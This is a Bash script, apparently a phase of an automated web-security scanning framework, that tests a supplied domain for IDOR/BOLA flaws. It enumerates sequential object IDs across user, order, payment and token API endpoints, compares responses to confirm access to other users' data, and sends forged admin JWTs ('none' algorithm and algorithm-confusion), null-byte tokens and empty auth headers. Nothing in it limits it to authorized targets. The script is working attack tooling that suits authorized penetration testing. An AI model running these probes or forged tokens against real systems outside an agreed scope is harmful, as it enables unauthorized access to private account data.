#!/usr/bin/env bash
# idor_test_phase.sh - IDOR/BOLA test harness, authorization header manipulation,
# object reference enumeration. CORE MOAT - business logic depth.

idor_test_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "idor_test_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/idor"

    local results=0
    local idor_file="$output_dir/idor/idor_vulns.txt"
    local auth_file="$output_dir/idor/auth_bypass.txt"

    log "INFO" "Starting IDOR/BOLA testing for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    # Common object reference endpoints
    local idor_endpoints=(
        "/api/users/{id}"
        "/api/user/{id}"
        "/api/accounts/{id}"
        "/api/profile/{id}"
        "/api/documents/{id}"
        "/api/files/{id}"
        "/api/orders/{id}"
        "/api/invoices/{id}"
        "/api/projects/{id}"
        "/api/organizations/{id}"
        "/api/customers/{id}"
        "/api/clients/{id}"
        "/api/items/{id}"
        "/api/records/{id}"
        "/api/objects/{id}"
        "/api/data/{id}"
        "/api/reports/{id}"
        "/api/transactions/{id}"
        "/api/payments/{id}"
        "/api/subscriptions/{id}"
    )

    # Authorization bypass techniques
    local auth_headers=(
        "Authorization: Bearer "
        "Authorization: Basic "
        "X-Auth-Token: "
        "X-Access-Token: "
        "X-API-Key: "
        "Cookie: session="
        "X-User-ID: "
        "X-Account-ID: "
        "X-Organization-ID: "
        "X-Tenant-ID: "
    )

    # Detect authenticated vs unauthenticated responses
    log "INFO" "Detecting authentication requirements"

    # Try to find valid object references via enumeration
    local valid_ids=()
    local test_endpoints=(
        "/api/users/1"
        "/api/user/1"
        "/api/users/0"
        "/api/users/100"
        "/api/users/1000"
    )

    for ep in "${test_endpoints[@]}"; do
        local url="https://${domain}${ep}"
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$url" 2>/dev/null || echo "000")

        if [[ "$status" == "200" || "$status" == "201" ]]; then
            local base_id
            base_id=$(echo "$ep" | grep -oE '[0-9]+' | head -1)
            valid_ids+=("$base_id")
            log "INFO" "Found valid object at $ep (ID: $base_id)"
        fi
    done

    # IDOR testing on discovered endpoints
    if [[ ${#valid_ids[@]} -gt 0 ]]; then
        log "INFO" "Testing IDOR with ${#valid_ids[@]} valid IDs"

        for idor_ep in "${idor_endpoints[@]}"; do
            for vid in "${valid_ids[@]}"; do
                local test_url="https://${domain}${idor_ep/\{id\}/$vid}"
                local status
                status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$test_url" 2>/dev/null || echo "000")

                if [[ "$status" == "200" || "$status" == "201" ]]; then
                    # Found accessible endpoint - test IDOR with sequential IDs
                    local base_num=$((vid))
                    local test_ids=("$((base_num + 1))" "$((base_num - 1))" "$((base_num + 10))" "$((base_num + 100))")

                    for test_id in "${test_ids[@]}"; do
                        local idor_url="https://${domain}${idor_ep/\{id\}/$test_id}"
                        local idor_status
                        idor_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$idor_url" 2>/dev/null || echo "000")

                        if [[ "$idor_status" == "200" ]]; then
                            # Verify response bodies differ (confirming actual data access)
                            local resp1
                            resp1=$(curl -s -m 10 "$test_url" 2>/dev/null | head -c 500 || true)
                            local resp2
                            resp2=$(curl -s -m 10 "$idor_url" 2>/dev/null | head -c 500 || true)

                            if [[ "$resp1" != "$resp2" ]]; then
                                echo "[IDOR-VULN] $idor_ep - ID $vid vs $test_id both accessible with different data" >> "$idor_file"
                                echo "  Request: GET $idor_url" >> "$idor_file"
                                echo "  Response: HTTP $idor_status" >> "$idor_file"
                                echo "---" >> "$idor_file"
                                ((results++)) || true
                            fi
                        fi
                    done
                fi
            done
        done
    fi

    # Authorization header manipulation
    log "INFO" "Testing authorization header manipulation"
    local auth_test_endpoints=("/api/users/me" "/api/profile" "/api/account" "/api/dashboard" "/api/settings")

    for ep in "${auth_test_endpoints[@]}"; do
        local url="https://${domain}${ep}"

        # Test with empty auth header
        local empty_status
        empty_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -H "Authorization: " "$url" 2>/dev/null || echo "000")
        if [[ "$empty_status" == "200" ]]; then
            echo "[AUTH-BYPASS] $ep - Accessible with empty Authorization header" >> "$auth_file"
            ((results++)) || true
        fi

        # Test with malformed JWT
        local malformed_jwt="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
        local jwt_status
        jwt_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -H "Authorization: Bearer $malformed_jwt" "$url" 2>/dev/null || echo "000")
        if [[ "$jwt_status" == "200" ]]; then
            echo "[JWT-BYPASS] $ep - Accepts 'none' algorithm JWT" >> "$auth_file"
            ((results++)) || true
        fi

        # Test with algorithm confusion (RS256 to HS256)
        local alg_confuse_jwt="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.signature"
        local alg_status
        alg_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -H "Authorization: Bearer $alg_confuse_jwt" "$url" 2>/dev/null || echo "000")
        if [[ "$alg_status" == "200" ]]; then
            echo "[ALG-CONFUSION] $ep - Susceptible to JWT algorithm confusion" >> "$auth_file"
            ((results++)) || true
        fi

        # Test with null byte in token
        local null_status
        null_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -H "Authorization: Bearer test%00admin" "$url" 2>/dev/null || echo "000")
        if [[ "$null_status" == "200" ]]; then
            echo "[NULL-BYTE-AUTH] $ep - Null byte in auth token accepted" >> "$auth_file"
            ((results++)) || true
        fi
    done

    # Horizontal privilege escalation via parameter manipulation
    log "INFO" "Testing horizontal privilege escalation"
    local params=("user_id" "account_id" "id" "uid" "customer_id" "client_id" "org_id" "tenant_id")

    for param in "${params[@]}"; do
        local hpe_url="https://${domain}/api/me?${param}=1"
        local hpe_status
        hpe_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$hpe_url" 2>/dev/null || echo "000")
        if [[ "$hpe_status" == "200" ]]; then
            local hpe_url2="https://${domain}/api/me?${param}=2"
            local hpe_status2
            hpe_status2=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$hpe_url2" 2>/dev/null || echo "000")
            if [[ "$hpe_status2" == "200" ]]; then
                echo "[HPE-PARAM] /api/me accepts ${param} parameter - both ID 1 and 2 return 200" >> "$idor_file"
                ((results++)) || true
            fi
        fi
    done

    # Object reference in different contexts
    log "INFO" "Testing object reference across contexts"
    local context_endpoints=(
        "/api/users/{id}/documents"
        "/api/users/{id}/files"
        "/api/users/{id}/settings"
        "/api/users/{id}/tokens"
        "/api/users/{id}/sessions"
        "/api/organizations/{id}/users"
        "/api/organizations/{id}/settings"
    )

    if [[ ${#valid_ids[@]} -gt 0 ]]; then
        for ctx_ep in "${context_endpoints[@]}"; do
            for vid in "${valid_ids[@]}"; do
                local ctx_url="https://${domain}${ctx_ep/\{id\}/$vid}"
                local ctx_status
                ctx_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$ctx_url" 2>/dev/null || echo "000")

                if [[ "$ctx_status" == "200" ]]; then
                    # Test with adjacent ID
                    local adj_id=$((vid + 1))
                    local adj_url="https://${domain}${ctx_ep/\{id\}/$adj_id}"
                    local adj_status
                    adj_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$adj_url" 2>/dev/null || echo "000")

                    if [[ "$adj_status" == "200" ]]; then
                        echo "[CONTEXT-IDOR] $ctx_ep - Both $vid and $adj_id accessible" >> "$idor_file"
                        ((results++)) || true
                    fi
                fi
            done
        done
    fi

    # Write count
    echo "$results" > "$output_dir/idor/count.txt"

    if [[ -f "$(dirname "$0")/../core/phase_bridge.sh" ]]; then
        source "$(dirname "$0")/../core/phase_bridge.sh" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "idor" "CRITICAL" "$line" 2>/dev/null || true
        done < "$idor_file" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "idor" "HIGH" "$line" 2>/dev/null || true
        done < "$auth_file" 2>/dev/null || true
    fi

    py_log "INFO" "idor_test_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "IDOR/BOLA phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    idor_test_phase "$@"
fi
